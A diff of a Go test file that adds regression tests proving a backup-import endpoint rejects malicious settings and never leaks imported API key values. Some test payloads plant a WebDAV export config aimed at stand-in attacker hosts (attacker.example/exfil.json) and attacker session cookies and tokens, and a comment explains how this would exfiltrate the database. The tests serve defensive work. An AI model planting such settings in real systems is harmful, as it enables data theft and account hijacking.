@@ -7,6 +7,8 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"os"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -70,7 +72,7 @@ func setBackupExportLimitsForTest(t *testing.T, maxRows int, maxCellBytes int, m
 func TestImportTableRowsWithConnRejectsUnknownColumns(t *testing.T) {
 	db := setupBackupTestDB(t)
 
-	_, err := importTableRowsWithConn(db.DB, "settings", []map[string]any{
+	_, _, err := importTableRowsWithConn(db.DB, "settings", []map[string]any{
 		{
 			"key":                      "safe-key",
 			"value":                    "safe-value",
@@ -96,7 +98,7 @@ func TestImportTableRowsWithConnRejectsUnknownColumns(t *testing.T) {
 func TestImportTableRowsWithConnAllowsKnownColumns(t *testing.T) {
 	db := setupBackupTestDB(t)
 
-	n, err := importTableRowsWithConn(db.DB, "settings", []map[string]any{
+	n, skipped, err := importTableRowsWithConn(db.DB, "settings", []map[string]any{
 		{
 			"key":   "theme",
 			"value": "dark",
@@ -107,6 +109,9 @@ func TestImportTableRowsWithConnAllowsKnownColumns(t *testing.T) {
 	}
 	if n != 1 {
 		t.Fatalf("imported = %d, want 1", n)
+	}
+	if skipped != 0 {
+		t.Fatalf("skipped = %d, want 0", skipped)
 	}
 
 	var value string
@@ -875,16 +880,23 @@ func TestImportBackupTablesSkipsRuntimeLocalSettings(t *testing.T) {
 		"settings": json.RawMessage(`[
 			{"key":"theme","value":"\"dark\""},
 			{"key":"auth_token","value":"\"remote-admin-token\""},
-			{"key":"db_url","value":"\"postgres://remote.example/db\""}
+			{"key":"db_url","value":"\"postgres://remote.example/db\""},
+			{"key":"backup_webdav_config_v1","value":"{\"enabled\":true,\"fileUrl\":\"https://evil.example/dump.json\"}"},
+			{"key":"monitor_ldoh_cookie","value":"\"ld_auth_session=attacker\""},
+			{"key":"proxy_token","value":"\"attacker-proxy-token\""},
+			{"key":"account_credential_secret","value":"\"attacker-master-key\""}
 		]`),
 	}
 
-	imported, err := importBackupTables(db.DB, tables)
+	result, err := importBackupTables(db.DB, tables)
 	if err != nil {
 		t.Fatalf("importBackupTables: %v", err)
 	}
-	if imported["settings"] != 1 {
-		t.Fatalf("imported settings = %d, want only non-local setting", imported["settings"])
+	if result.imported["settings"] != 1 {
+		t.Fatalf("imported settings = %d, want only non-local setting", result.imported["settings"])
+	}
+	if result.skippedSettings != 6 {
+		t.Fatalf("skippedSettings = %d, want 6 runtime-local settings", result.skippedSettings)
 	}
 
 	var theme string
@@ -895,13 +907,391 @@ func TestImportBackupTablesSkipsRuntimeLocalSettings(t *testing.T) {
 		t.Fatalf("theme = %q, want dark JSON string", theme)
 	}
 
-	for _, key := range []string{"auth_token", "db_url"} {
+	for _, key := range []string{
+		"auth_token",
+		"db_url",
+		"backup_webdav_config_v1",
+		"monitor_ldoh_cookie",
+		"proxy_token",
+		"account_credential_secret",
+	} {
 		var count int
 		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = ?", key); err != nil {
 			t.Fatalf("count %s: %v", key, err)
 		}
 		if count != 0 {
 			t.Fatalf("runtime-local setting %s was imported", key)
+		}
+	}
+}
+
+// Regression (P0): a malicious backup planting backup_webdav_config_v1 makes
+// the backup-webdav scheduler export the whole database to an attacker
+// endpoint after the next restart; monitor_ldoh_cookie pins the monitor
+// session to an attacker credential. The import endpoint must count both in
+// skippedSettings and never store them, while benign keys keep importing.
+func TestImportBackupRejectsMaliciousRuntimeLocalSettings(t *testing.T) {
+	db := setupBackupTestDB(t)
+	handler := &backupHandler{db: db.DB}
+
+	payload := `{"tables":{"settings":[
+		{"key":"theme","value":"\"dark\""},
+		{"key":"backup_webdav_config_v1","value":"{\"enabled\":true,\"fileUrl\":\"https://attacker.example/exfil.json\",\"username\":\"a\",\"password\":\"b\",\"exportType\":\"all\",\"autoSyncEnabled\":true,\"autoSyncCron\":\"0 * * * *\"}"},
+		{"key":"monitor_ldoh_cookie","value":"\"ld_auth_session=attacker-session\""}
+	]}}`
+
+	req := httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(payload))
+	rec := httptest.NewRecorder()
+	handler.importBackup(rec, req)
+
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var body map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
+		t.Fatalf("unmarshal response: %v", err)
+	}
+	if skipped, ok := body["skippedSettings"].(float64); !ok || skipped != 2 {
+		t.Fatalf("skippedSettings = %v, want 2; body=%s", body["skippedSettings"], rec.Body.String())
+	}
+	imported, _ := body["imported"].(map[string]any)
+	if settings, ok := imported["settings"].(float64); !ok || settings != 1 {
+		t.Fatalf("imported[settings] = %v, want 1 (only the benign key)", imported)
+	}
+
+	for _, key := range []string{"backup_webdav_config_v1", "monitor_ldoh_cookie"} {
+		var count int
+		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = ?", key); err != nil {
+			t.Fatalf("count %s: %v", key, err)
+		}
+		if count != 0 {
+			t.Fatalf("runtime-local setting %s was imported", key)
+		}
+	}
+	var theme string
+	if err := db.Get(&theme, "SELECT value FROM settings WHERE key = ?", "theme"); err != nil {
+		t.Fatalf("benign setting was not imported: %v", err)
+	}
+}
+
+// Same regression through the TS v2.1 branch of the import endpoint.
+func TestImportBackupTSV21RejectsMaliciousRuntimeLocalSettings(t *testing.T) {
+	db := setupBackupTestDB(t)
+	handler := &backupHandler{db: db.DB}
+
+	payload := `{
+		"version": "2.1",
+		"timestamp": 1755678900000,
+		"preferences": {"settings": [
+			{"key": "theme", "value": "dark"},
+			{"key": "backup_webdav_config_v1", "value": {"enabled": true, "fileUrl": "https://attacker.example/exfil.json"}},
+			{"key": "monitor_ldoh_cookie", "value": "ld_auth_session=attacker-session"},
+			{"key": "proxy_token", "value": "attacker-proxy-token"}
+		]}
+	}`
+
+	req := httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(payload))
+	rec := httptest.NewRecorder()
+	handler.importBackup(rec, req)
+
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var body map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
+		t.Fatalf("unmarshal response: %v", err)
+	}
+	if skipped, ok := body["skippedSettings"].(float64); !ok || skipped != 3 {
+		t.Fatalf("skippedSettings = %v, want 3; body=%s", body["skippedSettings"], rec.Body.String())
+	}
+
+	for _, key := range []string{"backup_webdav_config_v1", "monitor_ldoh_cookie", "proxy_token"} {
+		var count int
+		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = ?", key); err != nil {
+			t.Fatalf("count %s: %v", key, err)
+		}
+		if count != 0 {
+			t.Fatalf("runtime-local setting %s was imported", key)
+		}
+	}
+	var theme string
+	if err := db.Get(&theme, "SELECT value FROM settings WHERE key = ?", "theme"); err != nil {
+		t.Fatalf("benign setting was not imported: %v", err)
+	}
+}
+
+// Importing an untrusted backup is equivalent to accepting the downstream
+// API keys it carries. The import capability is kept (migration scenario),
+// but newly admitted keys must be listed by name — never by key value — in
+// the import response and in the events audit trail.
+func TestImportBackupReportsNewDownstreamApiKeys(t *testing.T) {
+	db := setupBackupTestDB(t)
+	handler := &backupHandler{db: db.DB}
+
+	first := `{"tables":{"downstream_api_keys":[
+		{"name":"客户端A","key":"sk-first-secret","enabled":1}
+	]}}`
+	req := httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(first))
+	rec := httptest.NewRecorder()
+	handler.importBackup(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("first import status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var firstBody map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &firstBody); err != nil {
+		t.Fatalf("unmarshal first response: %v", err)
+	}
+	newKeys, _ := firstBody["newDownstreamApiKeys"].([]any)
+	if len(newKeys) != 1 || newKeys[0] != "客户端A" {
+		t.Fatalf("first import newDownstreamApiKeys = %v, want [客户端A]", firstBody["newDownstreamApiKeys"])
+	}
+	if strings.Contains(rec.Body.String(), "sk-first-secret") {
+		t.Fatal("import response leaks the downstream key value")
+	}
+
+	// Second import: 客户端A is a duplicate, 客户端B is new.
+	second := `{"tables":{"downstream_api_keys":[
+		{"name":"客户端A","key":"sk-first-secret","enabled":1},
+		{"name":"客户端B","key":"sk-second-secret","enabled":1}
+	]}}`
+	req = httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(second))
+	rec = httptest.NewRecorder()
+	handler.importBackup(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("second import status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var secondBody map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &secondBody); err != nil {
+		t.Fatalf("unmarshal second response: %v", err)
+	}
+	newKeys, _ = secondBody["newDownstreamApiKeys"].([]any)
+	if len(newKeys) != 1 || newKeys[0] != "客户端B" {
+		t.Fatalf("second import newDownstreamApiKeys = %v, want [客户端B] only", secondBody["newDownstreamApiKeys"])
+	}
+	if strings.Contains(rec.Body.String(), "sk-first-secret") || strings.Contains(rec.Body.String(), "sk-second-secret") {
+		t.Fatal("import response leaks the downstream key value")
+	}
+
+	// The events audit trail lists names and never the key values.
+	var events []struct {
+		Message string `db:"message"`
+	}
+	if err := db.Select(&events, "SELECT message FROM events WHERE type = 'backup' ORDER BY id"); err != nil {
+		t.Fatalf("query events: %v", err)
+	}
+	if len(events) != 2 {
+		t.Fatalf("backup events = %d, want 2 (one per import admitting keys)", len(events))
+	}
+	if !strings.Contains(events[0].Message, "客户端A") {
+		t.Fatalf("first event message = %q, want it to list 客户端A", events[0].Message)
+	}
+	if !strings.Contains(events[1].Message, "客户端B") {
+		t.Fatalf("second event message = %q, want it to list 客户端B", events[1].Message)
+	}
+	for _, ev := range events {
+		if strings.Contains(ev.Message, "sk-first-secret") || strings.Contains(ev.Message, "sk-second-secret") {
+			t.Fatalf("event message leaks downstream key value: %q", ev.Message)
+		}
+	}
+}
+
+// setupBackupPostgresTestDB opens the shared PostgreSQL test database behind
+// PG_TEST_DSN (skips when unset), mirroring the other PG integration tests.
+// The database is shared across packages (-p 1 in CI), so assertions must use
+// unique suffixes and before/after deltas instead of absolute state.
+func setupBackupPostgresTestDB(t *testing.T) *store.DB {
+	t.Helper()
+
+	dsn := strings.TrimSpace(os.Getenv("PG_TEST_DSN"))
+	if dsn == "" {
+		t.Skip("PG_TEST_DSN not set; skipping PostgreSQL integration test")
+	}
+
+	db, err := store.Open(store.DialectPostgres, dsn, false)
+	if err != nil {
+		t.Fatalf("open postgres: %v", err)
+	}
+	t.Cleanup(func() { db.Close() })
+
+	if err := store.AutoMigrate(db); err != nil {
+		t.Fatalf("migrate postgres: %v", err)
+	}
+	return db
+}
+
+// TestImportBackupRejectsMaliciousSettingsPostgres mirrors the SQLite
+// regression through the pgx driver so the $N placeholder path of the import
+// is covered too.
+func TestImportBackupRejectsMaliciousSettingsPostgres(t *testing.T) {
+	db := setupBackupPostgresTestDB(t)
+	handler := &backupHandler{db: db.DB}
+
+	suffix := strconv.FormatInt(time.Now().UnixNano(), 36)
+	benignKey := "theme_v6sec_" + suffix
+
+	payload := `{"tables":{"settings":[
+		{"key":"` + benignKey + `","value":"\"dark\""},
+		{"key":"backup_webdav_config_v1","value":"{\"enabled\":true,\"fileUrl\":\"https://attacker.example/exfil.json\"}"},
+		{"key":"monitor_ldoh_cookie","value":"\"ld_auth_session=attacker-session\""}
+	]}}`
+
+	var webdavBefore, cookieBefore int
+	if err := db.Get(&webdavBefore, "SELECT COUNT(*) FROM settings WHERE key = 'backup_webdav_config_v1'"); err != nil {
+		t.Fatalf("count webdav config before: %v", err)
+	}
+	if err := db.Get(&cookieBefore, "SELECT COUNT(*) FROM settings WHERE key = 'monitor_ldoh_cookie'"); err != nil {
+		t.Fatalf("count monitor cookie before: %v", err)
+	}
+
+	req := httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(payload))
+	rec := httptest.NewRecorder()
+	handler.importBackup(rec, req)
+
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var body map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
+		t.Fatalf("unmarshal response: %v", err)
+	}
+	if skipped, ok := body["skippedSettings"].(float64); !ok || skipped != 2 {
+		t.Fatalf("skippedSettings = %v, want 2; body=%s", body["skippedSettings"], rec.Body.String())
+	}
+
+	for key, before := range map[string]int{"backup_webdav_config_v1": webdavBefore, "monitor_ldoh_cookie": cookieBefore} {
+		var count int
+		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = $1", key); err != nil {
+			t.Fatalf("count %s: %v", key, err)
+		}
+		if count != before {
+			t.Fatalf("runtime-local setting %s count changed from %d to %d via import", key, before, count)
+		}
+	}
+	var theme string
+	if err := db.Get(&theme, "SELECT value FROM settings WHERE key = $1", benignKey); err != nil {
+		t.Fatalf("benign setting was not imported: %v", err)
+	}
+}
+
+// TestImportBackupTSV21MaliciousSettingsPostgres mirrors the TS v2.1 branch
+// through the pgx driver (Rebind / $N placeholders).
+func TestImportBackupTSV21MaliciousSettingsPostgres(t *testing.T) {
+	db := setupBackupPostgresTestDB(t)
+	handler := &backupHandler{db: db.DB}
+
+	suffix := strconv.FormatInt(time.Now().UnixNano(), 36)
+	payload := `{
+		"version": "2.1",
+		"timestamp": 1755678900000,
+		"preferences": {"settings": [
+			{"key": "theme_v6sec_` + suffix + `", "value": "dark"},
+			{"key": "backup_webdav_config_v1", "value": {"enabled": true, "fileUrl": "https://attacker.example/exfil.json"}},
+			{"key": "monitor_ldoh_cookie", "value": "ld_auth_session=attacker-session"}
+		]}
+	}`
+
+	var webdavBefore, cookieBefore int
+	if err := db.Get(&webdavBefore, "SELECT COUNT(*) FROM settings WHERE key = 'backup_webdav_config_v1'"); err != nil {
+		t.Fatalf("count webdav config before: %v", err)
+	}
+	if err := db.Get(&cookieBefore, "SELECT COUNT(*) FROM settings WHERE key = 'monitor_ldoh_cookie'"); err != nil {
+		t.Fatalf("count monitor cookie before: %v", err)
+	}
+
+	req := httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(payload))
+	rec := httptest.NewRecorder()
+	handler.importBackup(rec, req)
+
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var body map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
+		t.Fatalf("unmarshal response: %v", err)
+	}
+	if skipped, ok := body["skippedSettings"].(float64); !ok || skipped != 2 {
+		t.Fatalf("skippedSettings = %v, want 2; body=%s", body["skippedSettings"], rec.Body.String())
+	}
+
+	for key, before := range map[string]int{"backup_webdav_config_v1": webdavBefore, "monitor_ldoh_cookie": cookieBefore} {
+		var count int
+		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = $1", key); err != nil {
+			t.Fatalf("count %s: %v", key, err)
+		}
+		if count != before {
+			t.Fatalf("runtime-local setting %s count changed from %d to %d via import", key, before, count)
+		}
+	}
+}
+
+// TestImportBackupReportsNewDownstreamApiKeysPostgres exercises the
+// downstream-key admission audit on PostgreSQL ($N placeholders in the
+// exists-snapshot queries and the Rebind'd events insert).
+func TestImportBackupReportsNewDownstreamApiKeysPostgres(t *testing.T) {
+	db := setupBackupPostgresTestDB(t)
+	handler := &backupHandler{db: db.DB}
+
+	suffix := strconv.FormatInt(time.Now().UnixNano(), 36)
+	nameA := "v6sec-" + suffix + "-A"
+	nameB := "v6sec-" + suffix + "-B"
+	keyA := "sk-v6sec-" + suffix + "-a"
+	keyB := "sk-v6sec-" + suffix + "-b"
+
+	first := `{"tables":{"downstream_api_keys":[
+		{"name":"` + nameA + `","key":"` + keyA + `","enabled":true}
+	]}}`
+	req := httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(first))
+	rec := httptest.NewRecorder()
+	handler.importBackup(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("first import status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var firstBody map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &firstBody); err != nil {
+		t.Fatalf("unmarshal first response: %v", err)
+	}
+	newKeys, _ := firstBody["newDownstreamApiKeys"].([]any)
+	if len(newKeys) != 1 || newKeys[0] != nameA {
+		t.Fatalf("first import newDownstreamApiKeys = %v, want [%s]", firstBody["newDownstreamApiKeys"], nameA)
+	}
+	if strings.Contains(rec.Body.String(), keyA) {
+		t.Fatal("import response leaks the downstream key value")
+	}
+
+	// Second import: A is a duplicate, B is new.
+	second := `{"tables":{"downstream_api_keys":[
+		{"name":"` + nameA + `","key":"` + keyA + `","enabled":true},
+		{"name":"` + nameB + `","key":"` + keyB + `","enabled":true}
+	]}}`
+	req = httptest.NewRequest(http.MethodPost, "/api/settings/backup/import", strings.NewReader(second))
+	rec = httptest.NewRecorder()
+	handler.importBackup(rec, req)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("second import status = %d, want 200; body=%s", rec.Code, rec.Body.String())
+	}
+	var secondBody map[string]any
+	if err := json.Unmarshal(rec.Body.Bytes(), &secondBody); err != nil {
+		t.Fatalf("unmarshal second response: %v", err)
+	}
+	newKeys, _ = secondBody["newDownstreamApiKeys"].([]any)
+	if len(newKeys) != 1 || newKeys[0] != nameB {
+		t.Fatalf("second import newDownstreamApiKeys = %v, want [%s] only", secondBody["newDownstreamApiKeys"], nameB)
+	}
+	if strings.Contains(rec.Body.String(), keyA) || strings.Contains(rec.Body.String(), keyB) {
+		t.Fatal("import response leaks the downstream key value")
+	}
+
+	// Audit events list the admitted names and never the key values.
+	var messages []string
+	if err := db.Select(&messages, "SELECT message FROM events WHERE type = 'backup' AND message LIKE $1", "%"+suffix+"%"); err != nil {
+		t.Fatalf("query events: %v", err)
+	}
+	if len(messages) != 2 {
+		t.Fatalf("backup audit events for suffix %s = %d, want 2", suffix, len(messages))
+	}
+	for _, msg := range messages {
+		if strings.Contains(msg, keyA) || strings.Contains(msg, keyB) {
+			t.Fatalf("event message leaks downstream key value: %q", msg)
 		}
 	}
 }
